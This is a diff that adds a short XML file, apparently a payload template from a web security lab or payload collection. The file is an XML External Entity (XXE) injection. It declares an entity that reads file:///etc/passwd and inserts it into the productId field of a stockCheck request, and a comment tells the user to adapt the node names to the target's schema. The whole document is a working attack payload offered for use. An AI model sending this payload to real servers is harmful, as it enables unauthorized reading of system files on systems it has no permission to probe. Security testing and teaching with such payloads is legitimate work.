@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+  <productId>1&xxe;</productId>
+  <storeId>1</storeId>
+  <!-- Replace node names to fit target schema -->
+</stockCheck>
+
